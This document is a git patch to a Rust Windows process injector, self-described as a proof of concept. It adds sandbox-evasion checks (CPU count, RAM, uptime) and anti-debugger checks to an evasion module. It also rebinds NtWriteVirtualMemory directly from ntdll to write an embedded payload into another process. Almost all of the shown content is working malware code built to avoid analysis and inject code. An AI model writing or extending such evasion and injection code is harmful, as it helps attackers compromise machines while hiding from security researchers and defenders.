@@ -1,0 +1,105 @@
+From dcce31c683e9bbe22083c5983e34a6fb3eca9e4e Mon Sep 17 00:00:00 2001
+From: Ron Panduwana <panduwana@gmail.com>
+Date: Wed, 21 Oct 2026 04:18:34 +0700
+Subject: [PATCH 04/10] implement 3b
+
+---
+ inject/src/evasion.rs | 27 ++++++++++++++++++++++++++-
+ inject/src/main.rs    | 22 ++++++++++++++++++----
+ 2 files changed, 44 insertions(+), 5 deletions(-)
+
+diff --git a/inject/src/evasion.rs b/inject/src/evasion.rs
+index 0355980..6c73d7b 100644
+--- a/inject/src/evasion.rs
++++ b/inject/src/evasion.rs
+@@ -1,7 +1,11 @@
+ use sysinfo::{System, SystemExt};
++use windows_sys::Win32::System::Diagnostics::Debug::{IsDebuggerPresent, CheckRemoteDebuggerPresent};
++use windows_sys::Win32::System::Threading::GetCurrentProcess;
++use windows_sys::Win32::System::SystemInformation::GetTickCount64;
+ 
+-const MIN_CPUS: usize = 4;
++const MIN_CPUS: usize = 2;
+ const MIN_RAM_BYTES: u64 = 4 * 1024 * 1024 * 1024; // 4 GB
++const MIN_UPTIME_MS: u64 = 300 * 1000; // 300 seconds
+ 
+ pub fn run_evasion_checks() -> bool {
+     // 1. CPU Core Check
+@@ -17,5 +21,26 @@ pub fn run_evasion_checks() -> bool {
+     if total_memory < MIN_RAM_BYTES {
+         return false;
+     }
++
++    // 3. Uptime Check
++    let uptime = unsafe { GetTickCount64() };
++    if uptime < MIN_UPTIME_MS {
++        return false;
++    }
++
++    // 4. Debugger Checks
++    unsafe {
++        // PEB BeingDebugged
++        if IsDebuggerPresent() != 0 {
++            return false;
++        }
++
++        // CheckRemoteDebuggerPresent
++        let mut is_present = 0;
++        if CheckRemoteDebuggerPresent(GetCurrentProcess(), &mut is_present) != 0 && is_present != 0 {
++            return false;
++        }
++    }
++
+     true
+ }
+diff --git a/inject/src/main.rs b/inject/src/main.rs
+index df7a4ad..b1b3f31 100644
+--- a/inject/src/main.rs
++++ b/inject/src/main.rs
+@@ -2,10 +2,9 @@ use std::{ptr::null_mut, mem::size_of, process};
+ use clap::Parser;
+ mod evasion;
+ mod crypto;
+-use ntapi::ntmmapi::NtWriteVirtualMemory;
+-use ntapi::winapi::shared::ntdef::NT_SUCCESS;
++
+ use windows_sys::Win32::{
+-    Foundation::{CloseHandle, INVALID_HANDLE_VALUE},
++    Foundation::{CloseHandle, INVALID_HANDLE_VALUE, NTSTATUS},
+     System::{
+         Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, PROCESSENTRY32, Process32First, Process32Next},
+         Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
+@@ -13,6 +12,21 @@ use windows_sys::Win32::{
+     },
+ };
+ 
++#[link(name = "ntdll")]
++extern "system" {
++    fn NtWriteVirtualMemory(
++        ProcessHandle: isize,
++        BaseAddress: *mut std::ffi::c_void,
++        Buffer: *const std::ffi::c_void,
++        NumberOfBytesToWrite: usize,
++        NumberOfBytesWritten: *mut usize,
++    ) -> NTSTATUS;
++}
++
++fn nt_success(status: NTSTATUS) -> bool {
++    status >= 0
++}
++
+ include!(concat!(env!("OUT_DIR"), "/payload_data.rs"));
+ 
+ /// Simple Injector for PoC
+@@ -80,7 +94,7 @@ fn main() {
+         )
+     };
+ 
+-    if !NT_SUCCESS(status) {
++    if !nt_success(status) {
+         panic!("Failed to write the image to the target process. Status: {:#X}", status);
+     }
+ 
+-- 
+2.39.5 (Apple Git-154)
+
